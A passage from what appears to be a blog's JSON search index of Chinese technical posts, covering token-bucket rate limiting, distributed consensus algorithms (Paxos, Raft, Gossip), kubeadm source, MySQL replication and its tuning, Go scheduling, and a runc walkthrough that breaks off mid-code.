(PBS)，峰值Burst大小。\n3. Committed Information Rate (CIR)，提交信息率。\n4. Committed Burst Size (CBS)，提交Burst大小。\n\nPIR和CIR用于表示每秒IP包的字节数。PBS和CBS以字节为单位，必须大于0，推荐设置成大于当前路径MTU。\n\nMeter同样分为色盲模式和非色盲模式。\n\n如果工作在**色盲模式**下，且大小为B字节的包在t时间到达，算法工作如下：若令牌桶P不足以让B通过，则tag为红色，否则：若令牌桶C不足以让B通过，则tag为黄色且扣除桶P的令牌；若令牌桶C足以让B通过，则tag为绿色且同时扣除桶C和桶P的令牌。\n\n如果工作在**非色盲模式**下，大小为B字节的包在t时间到达，算法工作如下：若先前tag成红色，或令牌桶P不足以让B通过，则tag为红色，否则：若先前tag成黄色，或令牌桶C不足以让B通过，则tag为黄色且扣除桶P的令牌；若令牌桶C足以让B通过且先前标记成绿色，则tag为绿色且同时扣除桶C和桶P的令牌。\n\nsrTCM算法是根据 length of burst 来进行限速的。“单速率”指的是这个算法里两个令牌桶的增长速率都是一样的每秒CIR。两个令牌桶拥有不同的大小，就好像一条数轴用两个点分成了三个阶段，对应绿、黄、红。\n\ntrTCM的“双速率”是指两个令牌桶有不同的增长速率。增长的较慢的令牌桶是发放绿色标记的较为严苛的指标，增长的较快的令牌桶是一个下限，若这个令牌桶也handle不过来的流量就要无情的tag为红色，两者之间的就是黄色。\n\n### 参考\n\nhttps://wayjam.me/posts/ratelimit-with-redis-lua/\n\nhttps://www.cnblogs.com/ZCplayground/p/9451935.html\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["分布式"],"categories":["分布式"]},{"title":"分布式选主算法","url":"/2020/06/22/分布式选主算法/","content":"\n\n\n## 分布式选主算法\n\n### Bully Algorithm(霸道选举算法)\n\n霸道选举算法是一种分布式选举算法，每次都会选出存活的进程中ID最大的候选者。\n\n#### 霸道选举算法的假设\n\n霸道选举算法的假设包括：\n\n- 假设了可靠的通道通信，更进一步的假设是系统中任何两个进程之间都可以通信。\n- 每个进程都知道其他进程的编号，也就是说算法依赖一个全局的数据。\n- 假设进程能够明确地判断出一个正常运行的进程和一个已经崩溃的进程。\n\n#### 霸道选举算法的选举流程\n\n选举过程中会发送以下三种消息类型：\n\n1. Election消息：表示发起一次选举\n2. Answer(Alive)消息：对发起选举消息的应答\n3. Coordinator(Victory)消息：选举胜利者向参与者发送选举成功消息\n\n触发选举流程的事件包括：\n\n1. 当进程P从错误中恢复\n2. 检测到Leader失败\n\n选举流程：\n\n1. 如果P是最大的ID，直接向所有人发送Victory消息，成功新的Leader；否则向所有比他大的ID的进程发送Election消息\n2. 如果P再发送Election消息后没有收到Alive消息，则P向所有人发送Victory消息，成功新的Leader\n3. 如果P收到了从比自己ID还要大的进程发来的Alive消息，P停止发送任何消息，等待Victory消息（如果过了一段时间没有等到Victory消息，重新开始选举流程）\n4. 如果P收到了比自己ID小的进程发来的Election消息，回复一个Alive消息，然后重新开始选举流程\n5. 如果P收到Victory消息，把发送者当做Leader\n\n### Ring-based\n\n节点在环上击鼓传花式的通信。\n\n\n\n### Paxos\n\nPaxos算法是基于消息传递且具有高度容错特性的一致性算法，是目前公认的解决分布式一致性问题最有效的算法之一，其解决的问题就是在分布式系统中如何就某个值（决议）达成一致。\n\n#### 基础\n\n角色\n\n- Proposer：议案发起者。\n- Acceptor：决策者，可以批准议案。\n- Learner：最终决策的学习者。\n\n在具体的实现中，一个进程可能同时充当多种角色。比如一个进程可能既是Proposer又是Acceptor又是Learner。Proposer负责提出提案，Acceptor负责对提案作出裁决（accept与否），learner负责学习提案结果。\n还有一个很重要的概念叫提案（Proposal）。最终要达成一致的value就在提案里。只要Proposer发的提案被Acceptor接受（半数以上的Acceptor同意才行），Proposer就认为该提案里的value被选定了。Acceptor告诉Learner哪个value被选定，Learner就认为那个value被选定。只要Acceptor接受了某个提案，Acceptor就任务该提案里的value被选定了。\n\n为了避免单点故障，会有一个Acceptor集合，Proposer想Acceptor集合发送提案，Acceptor集合中的每个成员都有可能同意该提案且每个Acceptor只能批准一个提案，只有当一半以上的成员同意了一个提案，就认为该提案被选定了。\n\n![在这里插入图片描述](/images/20190619151030396.png)\n\n#### Paxos算法的过程\n\n阶段一（prepare阶段）：\n(a) Proposer选择一个提案编号N，然后向半数以上的Acceptor发送编号为N的Prepare请求。Pareper（N）\n(b) 如果一个Acceptor收到一个编号为N的Prepare请求，如果小于它已经响应过的请求，则拒绝，不回应或回复error。若N大于该Acceptor已经响应过的所有Prepare请求的编号（maxN），那么它就会将它已经接受过（已经经过第二阶段accept的提案）的编号最大的提案（如果有的话，如果还没有的accept提案的话返回{pok，null，null}）作为响应反馈给Proposer，同时该Acceptor承诺不再接受任何编号小于N的提案。\n\n阶段二（accept阶段）：\n(a) 如果一个Proposer收到半数以上Acceptor对其发出的编号为N的Prepare请求的响应，那么它就会发送一个针对[N,V]提案的Accept请求给半数以上的Acceptor。注意：V就是收到的响应中编号最大的提案的value（某个acceptor响应的它已经通过的{acceptN，acceptV}），如果响应中不包含任何提案，那么V就由Proposer自己决定。\n(b) 如果Acceptor收到一个针对编号为N的提案的Accept请求，只要该Acceptor没有对编号大于N的Prepare请求做出过响应，它就接受该提案。如果N小于Acceptor以及响应的prepare请求，则拒绝，不回应或回复error（当proposer没有收到过半的回应，那么他会重新进入第一阶段，递增提案号，重新提出prepare请求）。\n在上面的运行过程中，每一个Proposer都有可能会产生多个提案。但只要每个Proposer都遵循如上述算法运行，就一定能保证算法执行的正确性。\n\n\n\n### raft\n\n#### 基础\n\n**角色**\n\nRaft通过选举Leader并由Leader节点负责管理日志复制来实现多副本的一致性。\n\n在Raft中，节点有三种角色：\n\n- Leader：负责接收客户端的请求，将日志复制到其他节点并告知其他节点何时应用这些日志是安全的\n- Candidate：用于选举Leader的一种角色\n- Follower：负责响应来自Leader或者Candidate的请求\n\n角色转换如下图所示：\n\n![img](/images/471426-20180421111136094-922352391.png)\n\n- 所有节点初始状态都是Follower角色\n- 超时时间内没有收到Leader的请求则转换为Candidate进行选举\n- Candidate收到大多数节点的选票则转换为Leader；发现Leader或者收到更高任期的请求则转换为Follower\n- Leader在收到更高任期的请求后转换为Follower\n\n**任期**\n\nRaft把时间切割为任意长度的任期，每个任期都有一个任期号，采用连续的整数。\n\n每个任期都由一次选举开始，若选举失败则这个任期内没有Leader；如果选举出了Leader则这个任期内有Leader负责集群状态管理。\n\n\n\n**节点的执行规则**\n\n*所有节点*\n\n- 如果commitIndex > lastApplied，应用log[lastApplied]到状态机，增加lastApplied\n- 如果RPC请求或者响应包含的任期T > currentTerm，将currentTerm设置为T并转换为Follower\n\n*Followers*\n\n- 响应来自Leader和Candidate的RPC请求\n- 如果在选举超时周期内没有收到AppendEntries的请求或者给Candidate投票，转换为Candidate角色\n\n*Candidates*\n\n- 转换为candidate角色，开始选举：\n\n- - 递增currentTerm\n  - 给自己投票\n  - 重置选举时间\n  - 发送RequestVote给其他所有节点\n\n- 如果收到了大多数节点的选票，转换为Leader节点\n\n- 如果收到Leader节点的AppendEntries请求，转换为Follower节点\n\n- 如果选举超时，重新开始新一轮的选举\n\n*Leaders*\n\n- 一旦选举完成：发送心跳给所有节点；在空闲的周期内不断发送心跳保持Leader身份\n\n- 如果收到客户端的请求，将日志追加到本地log，在日志被应用到状态机后响应给客户端\n\n- 如果对于一个跟随者，最后日志条目的索引值大于等于 nextIndex，那么：发送从 nextIndex 开始的所有日志条目：\n\n- - 如果成功：更新相应跟随者的 nextIndex 和 matchIndex\n  - 如果因为日志不一致而失败，减少 nextIndex 重试\n  - 如果存在一个满足N > commitIndex的 N，并且大多数的matchIndex[i] ≥ N成立，并且log[N].term == currentTerm成立，那么令commitIndex等于这个N\n\n\n\n### totem协议\n\ntotem协议，最简单的形象就是，他将多个节点组成一个令牌环。多个节点手拉手形成一个圈，大家依次的传递token。只有获取到token的节点才有发送消息的权利。简单有效的解决了在分布式系统中各个节点的同步问题，因为只有一个节点会在一个时刻发送消息，不会出现冲突。当然，如果有节点发生意外时，令牌环就会断掉，此时大家不能够通信，而是重新组建出一个新的令牌环。\n\ngalera和corosync就是基于这个协议来实现。\n\n### gossip协议\n\n简单的描述下这个协议，首先要传播谣言就要有种子节点。种子节点每秒都会随机向其他节点发送自己所拥有的节点列表，以及需要传播的消息。任何新加入的节点，就在这种传播方式下很快地被全网所知道。这个协议的神奇就在于它从设计开始就没想到信息一定要传递给所有的节点，但是随着时间的增长，在最终的某一时刻，全网会得到相同的信息。当然这个时刻可能仅仅存在于理论，永远不可达。\n\n\n\n\n","tags":["分布式"],"categories":["分布式"]},{"title":"kubeadm原理分析","url":"/2020/06/22/kubernetes_adm源码分析/","content":"\n\n\n## kubeadm原理分析\n\n### 介绍\n\nkubeadm是Kubernetes 1.4开始新增的特性，用于快速搭建Kubernetes集群环境，两个命令就能把一个k8s集群搭建起来。之前广为诟病的“k8s环境搭建难”的问题，很快得到突破性的解决。本博文基于kubernetes v1.5.0源码对kubeadm工作原理和流程的分析，一窥其内部的工作流。\n\n### 执行流程\n\n![kubeadminit](/images/20170413223653157.jpg)\n\n![kubeadm](/images/20170413223709110.jpg)\n\n### 主要工作介绍\n\nkubeadm init主要工作：\n创建集群安全相关的的key、certs和conf文件。\n创建kube-apiserver、kube-controller-manager、kube-scheduler、etcd(如果没有配置external etcd)这些static pod的json格式的manifest文件，kubelet负责启动这些master组件。\n通过addons方式启动kube-discovery deployment、kube-proxy daemonSet、kube-dns deployment\n\nkubeadm join主要负责创建kubelet.conf，使kubelet能与API Server建立连接：\n访问kube-discovery服务获取cluster info（包含cluster ca证书、API Server endpoint列表和token。\n利用定的token，检验cluster info的签名。\n检验成功后，再与API Server建立连接，请求API Server为该node创建证书。\n根据获取到的证书创建kubelet.conf。\n\n### 分析\n\n源码分析：\n\n```go\nfunc main() {\n\tif err := app.Run(); err != nil {\n\t\tos.Exit(1)\n\t}\n}\n```\n\n执行run函数：\n\n```go\n// NewKubeadmCommand returns cobra.Command to run kubeadm command\nfunc NewKubeadmCommand(in io.Reader, out, err io.Writer) *cobra.Command {\n\tvar rootfsPath string\n\n\tcmds := &cobra.Command{\n\t\tUse:   \"kubeadm\",\n\t\tShort: \"kubeadm: easily bootstrap a secure Kubernetes cluster\",\n\t\tLong: dedent.Dedent(`\n\n\t\t\t    ┌──────────────────────────────────────────────────────────┐\n\t\t\t    │ KUBEADM                                                  │\n\t\t\t    │ Easily bootstrap a secure Kubernetes cluster             │\n\t\t\t    │                                                          │\n\t\t\t    │ Please give us feedback at:                              │\n\t\t\t    │ https://github.com/kubernetes/kubeadm/issues             │\n\t\t\t    └──────────────────────────────────────────────────────────┘\n\n\t\t\tExample usage:\n\n\t\t\t    Create a two-machine cluster with one control-plane node\n\t\t\t    (which controls the cluster), and one worker node\n\t\t\t    (where your workloads, like Pods and Deployments run).\n\n\t\t\t    ┌──────────────────────────────────────────────────────────┐\n\t\t\t    │ On the first machine:                                    │\n\t\t\t    ├──────────────────────────────────────────────────────────┤\n\t\t\t    │ control-plane# kubeadm init                              │\n\t\t\t    └──────────────────────────────────────────────────────────┘\n\n\t\t\t    ┌──────────────────────────────────────────────────────────┐\n\t\t\t    │ On the second machine:                                   │\n\t\t\t    ├──────────────────────────────────────────────────────────┤\n\t\t\t    │ worker# kubeadm join <arguments-returned-from-init>      │\n\t\t\t    └──────────────────────────────────────────────────────────┘\n\n\t\t\t    You can then repeat the second step on as many other machines as you like.\n\n\t\t`),\n\n\t\tPersistentPreRunE: func(cmd *cobra.Command, args []string) error {\n\t\t\tif rootfsPath != \"\" {\n\t\t\t\tif err := kubeadmutil.Chroot(rootfsPath); err != nil {\n\t\t\t\t\treturn err\n\t\t\t\t}\n\t\t\t}\n\t\t\treturn nil\n\t\t},\n\t}\n\n\tcmds.ResetFlags()\n\n\tcmds.AddCommand(NewCmdCompletion(out, \"\"))\n\tcmds.AddCommand(NewCmdConfig(out))\n\tcmds.AddCommand(NewCmdInit(out, nil))\n\tcmds.AddCommand(NewCmdJoin(out, nil))\n\tcmds.AddCommand(NewCmdReset(in, out, nil))\n\tcmds.AddCommand(NewCmdVersion(out))\n\tcmds.AddCommand(NewCmdToken(out, err))\n\tcmds.AddCommand(upgrade.NewCmdUpgrade(out))\n\tcmds.AddCommand(alpha.NewCmdAlpha(in, out))\n\n\toptions.AddKubeadmOtherFlags(cmds.PersistentFlags(), &rootfsPath)\n\n\treturn cmds\n}\n\n```\n\ndry-run表示测试，不真正执行命令\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["k8s"],"categories":["k8s"]},{"title":"mysql主从复制原理","url":"/2020/06/19/mysql双主复制原理/","content":"\n## mysql主从复制原理\n\n[toc]\n\n### 介绍\n\n在2000年，MySQL 3.23.15版本引入了Replication。Replication作为一种准实时同步方式，得到广泛应用。\n\n这个时候的Replicaton的实现涉及到两个线程，一个在Master，一个在Slave。Slave的I/O和SQL功能是作为一个线程，从Master获取到event后直接apply，没有relay log。这种方式使得读取event的速度会被Slave replay速度拖慢，当主备存在较大延迟时候，会导致大量binary log没有备份到Slave端。\n\n在2002年，MySQL 4.0.2版本将Slave端event读取和执行独立成两个线程（IO线程和SQL线程），同时引入了relay log。IO线程读取event后写入relay log，SQL线程从relay log中读取event然后执行。这样即使SQL线程执行慢，Master的binary log也会尽可能的同步到Slave。当Master宕机，切换到Slave，不会出现大量数据丢失。\n\nMySQL在2010年5.5版本之前，一直采用的是异步复制。主库的事务执行不会管备库的同步进度，如果备库落后，主库不幸crash，那么就会导致数据丢失。\n\nMySQL在5.5中引入了半同步复制，主库在应答客户端提交的事务前需要保证至少一个从库接收并写到relay log中。那么半同步复制是否可以做到不丢失数据呢。\n\n在2016年，MySQL在5.7.17中引入了Group Replication。\n\n### 几种复制协议差别\n\n![MySQL 5.7半同步复制技术](http://www.ywnds.com/wp-content/uploads/2016/04/2017012217093677-689x500.gif)\n\n对于异步复制，主库将事务Binlog事件写入到Binlog文件中，此时主库只会通知一下Dump线程发送这些新的Binlog，然后主库就会继续处理提交操作，而此时不会保证这些Binlog传到任何一个从库节点上。\n\n对于全同步复制，当主库提交事务之后，所有的从库节点必须收到，APPLY并且提交这些事务，然后主库线程才能继续做后续操作。这里面有一个很明显的缺点就是，主库完成一个事务的时间被拉长，性能降低。\n\n对于半同步复制，是介于全同步复制和异步复制之间的一种，主库只需要等待至少一个从库节点收到并且Flush Binlog到Relay Log文件即可，主库不需要等待所有从库给主库反馈。同时，这里只是一个收到的反馈，而不是已经完全执行并且提交的反馈，这样就节省了很多时间。\n\n### 异步复制\n\n异步复制也就是说的mysql的主从复制，叫replication。\n\n复制存在的问题：\n\n1. 宕机情况下，可能存在数据丢失情况\n2. 从库只有一个sql线程，主库写压力大时候，复制延迟\n\n基本原理介绍：\n\n1. mysql主从复制是一个异步复制的过程。从一个实例（master）复制到另一个实例（slave），整个过程要由master上的I/O进程和slave上的sql进程和I/O进程共同完成。\n2. 首先master必须打开binary log(bin-log),因为整个复制过程实际上就是slave端从master端获取相应的二进制日志，然后在本地完全顺序的执行日志中纪录的各种操作。\n\n主从复制过程：\n\n1. Slave 端的 IO 进程连接上 Master，向 Master 请求指定日志文件的指定位置（或者从最开始的日志）之后的日志内容；\n2. Master 接收到来自 Slave 的 IO 进程的请求后，负责复制的 IO 进程根据 Slave 的请求信息，读取相应日志内容，返回给 Slave 的IO进程，并将本次请求读取的 bin-log 文件名及位置一起返回给 Slave 端\n3. Slave 端的 IO 进程接收到信息后，将接收到的日志内容依次添加到 Slave 端的 relay-log(中继日志) 文件的最末端，并将读取到的 Master 端的 bin-log 的文件名和位置记录到 master-info 文件中，以便在下一次读取的时候能够清楚的告诉 Master ：”我需要从某个 bin-log 的哪个位置开始往后的日志内容，请发给我”；\n4. Slave 端的 Sql 进程检测到 relay-log (中继日志)中新增加了内容后，会马上解析 relay-log 的内容成为在 Master 端真实执行时候的那些可执行的内容，并在本地执行。\n\n复制拓扑：\n\n![image-20200601104405564](/images/image-20200601104405564.png)\n\n参数说明：\n\n```conf\nskip-name-resolve\t\t\t\t\t# 跳过域名\nslave_parallel_workers = ``8\t\t # 并行复制工作线程\nslave_parallel_type= logical_clock\t\t# 并行复制组提交并行复制\nmax_connections = ``8192\t\t\t# 最大连接数\nserver-id=``2\t\t\t\t\t\t# 服务id\nauto_increment_offset=``2\t\t\t# 自增偏移，两节点设置偶数和奇数\nauto_increment_increment=``2\t\t# 自增\nlog-bin = mysql-bin\t\t\t\t\t# 日志\nmax_binlog_size=1024M\t\t\t\t# 最大binlog日志大小\nreplicate-ignore-db = mysql\t\t\t\t#忽略同步数据库\nreplicate-ignore-db = information_schema\nreplicate-ignore-db = performance_schema\nreplicate-ignore-db = test\nbind-address=``10.130``.``232.91\t\t\t# 地址\nmax_allowed_packet = 500M\t\t\t\t\t#最大数据包\ninteractive_timeout = ``120\t\t\t\t#交互超时\nwait_timeout = ``120\t\t\t\t\t# 连接wait超时\nlog_warnings=``1\t\t\t\t\t\t# 日志warnings\nnet_read_timeout=``600\t\t\t\t\t# 数据读取超时时间\nnet_write_timeout=``600\t\t\t\t\t# 数据写入超时时间\ncharacter-set-server = utf8\t\t\t\t# 编码\nvalidate_password_policy=LOW\t\t\t# 密码铭感\nslave-skip-errors=all\t\t\t\t\t# slave跳过所有错误\n```\n\n### 半同步复制\n\n半同步复制原理图：\n\n![after_commit.png](http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/4153fcafc3c14bfa7ff94770d41b49a5.png)\n\nmaster将每个事务写入binlog（sync_binlog=1），传递到slave刷新到磁盘(sync_relay=1)，同时主库提交事务（commit）。master等待slave反馈收到relay log，只有收到ACK后master才将commit OK结果反馈给客户端。\n\n半同步具体特性：\n\n1. 从库会在连接到主库时告诉主库，它是不是配置了半同步。\n2. 如果半同步复制在主库端是开启了的，并且至少有一个半同步复制的从库节点，那么此时主库的事务线程在提交时会被阻塞并等待，结果有两种可能，要么至少一个从库节点通知它已经收到了所有这个事务的Binlog事件，要么一直等待直到超过配置的某一个时间点为止，而此时，半同步复制将自动关闭，转换为异步复制。\n3. 从库节点只有在接收到某一个事务的所有Binlog，将其写入并Flush到Relay Log文件之后，才会通知对应主库上面的等待线程。\n4. 如果在等待过程中，等待时间已经超过了配置的超时时间，没有任何一个从节点通知当前事务，那么此时主库会自动转换为异步复制，当至少一个半同步从节点赶上来时，主库便会自动转换为半同步方式的复制。\n5. 半同步复制必须是在主库和从库两端都开启时才行，如果在主库上没打开，或者在主库上开启了而在从库上没有开启，主库都会使用异步方式复制。\n\n一致性问题分析：\n\n半同步方式，主库在等待备库ack时候，如果超时会退化为异步，这就可能导致数据丢失。在接下来分析中，先假设rpl_semi_sync_master_timeout足够大，不会退化为异步方式。\n\n1)rpl_semi_sync_master_wait_point配置\n\n参考资料源码分析得：\n\nrpl_semi_sync_master_wait_point分为：WAIT_AFTER_COMMIT和WAIT_AFTER_SYNC\n\n配置after_commit：\n\n![after_commit.png](http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/4153fcafc3c14bfa7ff94770d41b49a5.png)\n\n即在等待Slave ACK时候，虽然没有返回当前客户端，但事务已经提交，其他客户端会读取到已提交事务。如果Slave端还没有读到该事务的events，同时主库发生了crash，然后切换到备库。那么之前读到的事务就不见了，出现了幻读。\n\n配置after_sync:\n\n![after_sync.png](http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/08b666b3acb193dc1a0aa5ca506a345c.png)\n\n在调用binlog sync之后，engine层commit之前等待Slave ACK。这样只有在确认Slave收到事务events后，事务才会提交。在commit之前等待Slave ACK，同时可以堆积事务，利于group commit，有利于提升性能。\n\n2）after_sync和after_commit配置分析：\n\nWAIT_AFTER_SYNC和WAIT_AFTER_COMMIT两图中Send Events的位置，也可能导致主备数据不一致，出现同步失败的情形。实际在rpl_semi_sync_master_wait_point分析的图中是sync binlog大于1的情况。根据上面源码，流程如下图所示。Master依次执行flush binlog， update binlog position， sync binlog。如果Master在update binlog position后，sync binlog前掉电，Master再次启动后原事务就会被回滚。但可能出现Slave获取到Events，这也会导致Slave数据比Master多，主备同步失败。\n\n![sync_after_update.png](http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/dcd2d2a0c5b1e5cdaee20ed22f2ba8b9.png)\n\n由于上面的原因，sync_binlog设置为1的时候，MySQL会update binlog end pos after sync。流程如下图所示。这时候，对于每一个事务都需要sync binlog，同时sync binlog和网络发送events会是一个串行的过程，性能下降明显。\n\n![update_after_sync.png](http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/f27a51f68bd1922bccc2009381107a9d.png)\n\n3）sync_relay_log配置\n\n在Slave的IO线程中get_sync_period获得的是sync_relay_log的值，与sync_binlog对sync控制一样。当sync_relay_log不是1的时候，semisync返回给Master的position可能没有sync到磁盘。在gtid_mode下，在保证前面两个配置正确的情况下，sync_relay_log不是1的时候，仅发生Master或Slave的一次Crash并不会发生数据丢失或者主备同步失败情况。如果发生Slave没有sync relay log，Master端事务提交，客户端观察到事务提交，然后Slave端Crash。这样Slave端就会丢失掉已经回复Master ACK的事务events。\n\n![slave_crash.png](http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/62a885ef35f03a205b7a38ddbcb83a96.png)\n\n### 并行优化\n\nMySQL5.6提出并行复制，官方称为为enhanced multi-threaded slave（简称MTS）\n\nMySQL的主备同步是通过binlog在备库重放进行的，IO线程把主库binlog拉过去存入relaylog，然后SQL线程重放 relaylog 中的event，然而这种模式有一个问题就是SQL线程只有一个，在主库压力大的时候，备库单个SQL线程是跑不过主库的多个用户线程的，这样备库延迟是不可避免的。为了解决这种n对1造成的备库延迟问题，5.6 引入了并行复制机制，即SQL线程在执行的时候可以并发跑。\n\n![image-20200601112945808](/images/image-20200601112945808.png)\n\n在MySQL 5.6版本之前，Slave服务器上有两个线程I/O线程和SQL线程。I/O线程负责接收二进制日志（更准确的说是二进制日志的event），SQL线程进行回放二进制日志。如果在MySQL 5.6版本开启并行复制功能，那么SQL线程就变为了coordinator线程，coordinator线程主要负责以前两部分的内容：\n\n1. 若判断可以并行执行，那么选择worker线程执行事务的二进制日志\n2. 若判断不可以并行执行，如该操作是DDL，亦或者是事务跨schema操作，则等待所有的worker线程执行完成之后，再执行当前的日志\n\ncoordinator线程并不是仅将日志发送给worker线程，自己也可以回放日志，但是所有可以并行的操作交付由worker线程完成。coordinator线程与worker是典型的生产者与消费者模型。\n\nMySQL 5.7基于组提交的并行复制：\n\nMySQL 5.7才可称为真正的并行复制，这其中最为主要的原因就是slave服务器的回放与主机是一致的即master服务器上是怎么并行执行的slave上就怎样进行并行回放。不再有库的并行复制限制，对于二进制日志格式也无特殊的要求（基于库的并行复制也没有要求）。\n\nMySQL 5.7并行复制的思想简单易懂，一言以蔽之： **一个组提交的事务都是可以并行回放** ，因为这些事务都已进入到事务的prepare阶段，则说明事务之间没有任何冲突（否则就不可能提交）。\n\n为了兼容MySQL 5.6基于库的并行复制，5.7引入了新的变量slave-parallel-type，其可以配置的值有：\n\n- DATABASE：默认值，基于库的并行复制方式\n- LOGICAL_CLOCK：基于组提交的并行复制方式\n\n并行复制配置调优：\n\nmaster_info_repository： 开启MTS功能后，务必将参数master_info_repostitory设置为TABLE，这样性能可以有50%~80%的提升。\n\n开启enhanced multi-threaded slave：\n\n```\nslave-parallel-type=LOGICAL_CLOCK\nslave-parallel-workers=16\nmaster_info_repository=TABLE\nrelay_log_info_repository=TABLE\nrelay_log_recovery=ON\n```\n\n虽然mysql5.7添加MTS后，虽然slave可以并行应用relay log，但commit部分仍然是顺序提交，其中可能会有等待的情况。当开启slave_preserve_commit_order参数后，slave_parallel_type只能是LOGICAL_CLOCK，如果你有使用级联复制，那`LOGICAL_CLOCK可能会使离master越远的slave并行性越差。\n\n### group replication\n\nMySQL Group Replication（简称MGR）是MySQL官方于2016年12月推出的一个全新的高可用与高扩展的解决方案。MySQL组复制提供了高可用、高扩展、高可靠的MySQL集群服务。\n\n高一致性，基于原生复制及paxos协议的组复制技术，并以插件的方式提供，提供一致数据安全保证；\n\n![img](/images/1311801-20180906105509772-1977689111.png)\n\n需要选主来保证集群一致性，相比galera，没有galera一致性强。\n\n### 双主复制\n\n双主的方式和互为主从的实现原理一致，不过是互为主从。\n\n![Image](/images/wKioL1gh5TqwapxCAAB3AioNZqw030.jpg)\n\n双主架构思路：\n\n1.两台mysql都可读写，互为主备，默认只使用一台（masterA）负责数据的写入，另一台（masterB）备用；\n\n2.masterA是masterB的主库，masterB又是masterA的主库，它们互为主从；\n\n3.所有提供服务的从服务器与masterB进行主从同步（双主多从）;\n\n4.建议采用高可用策略的时候，masterA或masterB均不因宕机恢复后而抢占VIP（非抢占模式）；\n\n这样做可以在一定程度上保证主库的高可用,在一台主库down掉之后,可以在极短的时间内切换到另一台主库上（尽可能减少主库宕机对业务造成的影响），减少了主从同步给线上主库带来的压力；\n\n不足：\n\n1. masterB可能会一直处于空闲状态\n2. 主库后面提供服务的从库要等masterB先同步完了数据后才能去masterB上去同步数据，这样可能会造成一定程度的同步延时；\n3. 脏数据问题\n\n并发优化：mysql基于5.7.21版本，在这个基础上增加了组并发回放的机制，能够更加快的同步数据。相比于异步复制的方式好一些。\n\n同步一致性问题：\n\n1）**相同步长免冲突**\n\n2）**上游生成ID避冲突**\n\n3）定期进行主从一致性检验\n\n遇到的问题：\n\n1）多节点写入问题：mysql互为主从的环境，更新一条语句同时提交，update一条记录同时提交，有主键的情况下，sql_thread是根据主键匹配行记录，不会校验行数据，所以m1更新了m2中表的记录，m2更新了m1中表的记录。update一条记录同时提交，有没有主键的情况下，sql_thread是根据全表扫描匹配行记录，所以m1更新在m2中找不到需要更新的行，报1032错误，m2更新在m1中找不到需要更新的行，也报1032错误。\n\n2）1062错误， 主键冲突，出现这种情况就是从库出现插入操作，主库又重新来了一遍，iothread没问题，sqlthread出错\n\n3）1032错误，现在生产库中好多数据，在从库误删了，生产库更新后找不到了，现在主从不同步了，再跳过错误也没用，因为没这条，再更新还会报错，\n\n4）遇到最多的就是从库数据被修改之后，无法保证一致了。\n\n### 总结\n\nmysql不同复制协议在一致性方面所有差异，但是总体看来在某些场景下，存在不一致的问题。需要针对具体情况去解决分析和优化方案。\n\n半同步复制虽然增加了ack确认的机制，但是在一些场景下依然存在数据一致性的问题。\n\n双主方案可以在一些对数据一致性不高的环境中使用，存在数据不一致的情况，需要针对不同的情况进行处理。相比galera多主和group replication的方案较差。\n\n### 参考资料\n\n数据库月报：http://mysql.taobao.org/monthly/2017/04/01/\n\n\n\n\n\n","tags":["mysql"],"categories":["mysql"]},{"title":"go协程调度机制","url":"/2020/06/19/go协程调度机制/","content":"\n## go协程调度机制\n\n### 介绍\n\n### ![image-20200615092403012](/images/image-20200615092403012.png)\n\nProcessor（简称 P）  \n\ngoroutine（简称 G）  \n\n系统线程（简称 M）  \n\n⾸先是 Processor（简称 P），其作⽤类似 CPU 核，⽤来控制可同时并发执⾏的任务数量。每个⼯作线程都必须绑定⼀个有效 P 才被允许执⾏任务，否则只能休眠，直到有空闲 P 时被唤醒。P 还为线程提供执⾏资源，⽐如对象分配内存、本地任务队列等。线程独享所绑定的 P 资源，可在⽆锁状态下执⾏⾼效操作。\n基本上，进程内的⼀切都在以 goroutine（简称 G）⽅式运⾏，包括运⾏时相关服务，以及main.main ⼊⼜函数。需要指出，G 并⾮执⾏体，它仅仅保存并发任务状态，为任务执⾏提供所需栈内存空间。G 任务创建后被放置在 P 本地队列或全局队列，等待⼯作线程调度\n执⾏。  \n\n实际执⾏体是系统线程（简称 M），它和 P 绑定，以调度循环⽅式不停执⾏ G 并发任务。M 通过修改寄存器，将执⾏栈指向 G ⾃带栈内存，并在此空间内分配堆栈帧，执⾏任务函数。当需要中途切换时，只要将相关寄存器值保存回 G 空间即可维持状态，任何 M 都可据此恢复执⾏。线程仅负责执⾏，不再持有状态，这是并发任务跨线程调度，实现多路复⽤的根本所在。\n\n尽管 P/M 构成执⾏组合体，但两者数量并⾮⼀⼀对应。通常情况下，P 数量相对恒定，默认与 CPU 核数量相同，但也可能更多或更少，⽽ M 则是调度器按需创建。举例来说，当M 因陷⼊系统调⽤⽽长时间阻塞时，P 就会被监控线程抢回，去新建（或唤醒）⼀个 M 执⾏其他任务，如此 M 的数量就会增长。\n\n因为 G 初始栈仅有 2KB，且创建操作只是在⽤户空间简单的对象分配，远⽐进⼊内核态分配线程要简单得多。调度器让多个 M 进⼊调度循环，不停获取并执⾏任务，所以我们才能创建成千上万个并发任务  \n","tags":["golang"],"categories":["golang"]},{"title":"runc原理学习","url":"/2020/03/31/runc原理学习/","content":"\n## runc原理学习\n\n### 1. 代码结构\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190302170732673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NoZW5tbzE4N0ozWDE=,size_16,color_FFFFFF,t_70)\n\n### 2. 原理分析\n\n从create -> start -> run-> stop来分析：\n\n![runc](http://www.sel.zju.edu.cn/wp-content/uploads/2018/08/runc.png)\n\ncreateCommand代码入口：\n\n```go\nAction: func(context *cli.Context) error {\n\t\tspec, err := setupSpec(context)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\tstatus, err := startContainer(context, spec, true)  // 开启容器\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\t// exit with the container's exit status so any external supervisor is\n\t\t// notified of the exit with the correct exit status.\n\t\tos.Exit(status)\n\t\treturn nil\n\t},\n```\n\nstartContainter:\n\n```go\nfunc startContainer(context *cli.Context, spec *specs.Spec, create bool) 